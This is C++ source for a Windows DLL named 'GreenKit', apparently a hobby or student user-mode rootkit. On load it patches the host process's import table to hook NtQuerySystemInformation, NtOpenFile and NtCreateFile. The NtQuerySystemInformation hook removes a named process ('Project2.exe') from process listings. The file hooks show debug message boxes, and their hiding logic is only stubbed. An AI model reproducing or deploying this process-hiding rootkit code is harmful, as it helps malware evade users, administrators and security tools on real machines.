#include "stdafx.h"
#include "GreenKit.h"

std::map<std::string, void*> m_OldFunctionsMap;
const wchar_t* m_ProcessToHide = L"Project2.exe";

BOOL mustHideFile(TCHAR filePath) {
    return FALSE; // TODO check la fin de la string avec des constantes
}

BOOL mustHideReg(TCHAR filePath) {
    return TRUE; // TODO check la fin de la string avec des constantes
}

NTSTATUS WINAPI NewNtOpenFile(
    PHANDLE				phFile,
    ACCESS_MASK			DesiredAccess,
    POBJECT_ATTRIBUTES	ObjectAttributes,
    PIO_STATUS_BLOCK	IoStatusBlock,
    ULONG				ShareAccess,
    ULONG				OpenOptions)
{
    TCHAR sPath[MAX_PATH];
    //DWORD dwRet;
    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
    MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
    //if (!mustHideFile(*sPath))
    NTSTATUS status = ((PNT_OPEN_FILE)m_OldFunctionsMap["NtOpenFile"])(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);

    return status; // STATUS_NO_SUCH_FILE
}

NTSTATUS WINAPI NewNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
    ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
{
    //TCHAR sPath[MAX_PATH];
    //DWORD dwRet;
    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
    MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
    //if (!mustHideFile(*sPath))
    NTSTATUS status = ((PNT_CREATE_FILE)m_OldFunctionsMap["NtCreateFile"])(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
        CreateOptions, EaBuffer, EaLength);

    return status; // STATUS_NO_SUCH_FILE
}

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID                    SystemInformation,
    __in       ULONG                    SystemInformationLength,
    __out_opt  PULONG                   ReturnLength
    )
{
    NTSTATUS status = ((PNT_QUERY_SYSTEM_INFORMATION) m_OldFunctionsMap["NtQuerySystemInformation"])(SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);
    
    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        //
        // Loop through the list of processes
        //

        PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
        PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;

        do
        {
            pCurrent = pNext;
            pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

            if (!wcsncmp(pNext->ImageName.Buffer, m_ProcessToHide, pNext->ImageName.Length))
            {
                if (0 == pNext->NextEntryOffset)
                {
                    pCurrent->NextEntryOffset = 0;
                }
                else
                {
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                }

                pNext = pCurrent;
            }
        } while (pCurrent->NextEntryOffset != 0);
    }
    return status;
}

void *Hook(char *szDllName, char *szFunctionName, void *pNewFunction)
{
#define MakePtr(cast, ptr, addValue)(cast)((DWORD)(ptr) + (DWORD)(addValue))
    DWORD dwOldProtect, dwOldProtect2;
    HMODULE hModule = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNTHeader;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PIMAGE_THUNK_DATA pThunk;
    void *pOldFunction;
    if (!(pOldFunction = GetProcAddress(GetModuleHandle(szDllName), szFunctionName))) return 0;
    pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return (NULL);
    pNTHeader = MakePtr(PIMAGE_NT_HEADERS, pDosHeader, pDosHeader->e_lfanew);
    if (pNTHeader->Signature != IMAGE_NT_SIGNATURE || (pImportDesc = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, pDosHeader, pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)) == (PIMAGE_IMPORT_DESCRIPTOR)pNTHeader) return (NULL);
    while (pImportDesc->Name)
    {
        char *szModuleName = MakePtr(char *, pDosHeader, pImportDesc->Name);
        if (!stricmp(szModuleName, szDllName)) break;
        pImportDesc++;
    }
    if (pImportDesc->Name == NULL) return (NULL);
    pThunk = MakePtr(PIMAGE_THUNK_DATA, pDosHeader, pImportDesc->FirstThunk);
    while (pThunk->u1.Function)
    {
        if (pThunk->u1.Function == (DWORD)pOldFunction)
        {
            VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtect);
            pThunk->u1.Function = (DWORD)pNewFunction;
            VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), dwOldProtect, &dwOldProtect2);
            return (pOldFunction);
        }
        pThunk++;
    }
    return (NULL);
}

bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        void* l_OldNtQuerySysInformation = Hook("NTDLL.DLL", "NtQuerySystemInformation", HookedNtQuerySystemInformation);
        void* l_OldNtOpenFile = Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile);
        void* l_OldNtCreateFile = Hook("NTDLL.DLL", "NtCreateFile", NewNtCreateFile);

        m_OldFunctionsMap.insert(std::pair<std::string, void*>("NtQuerySystemInformation", l_OldNtQuerySysInformation));
        m_OldFunctionsMap.insert(std::pair<std::string, void*>("NtOpenFile", l_OldNtOpenFile));
        m_OldFunctionsMap.insert(std::pair<std::string, void*>("NtCreateFile", l_OldNtCreateFile));
        return TRUE;
    }
    return TRUE;
}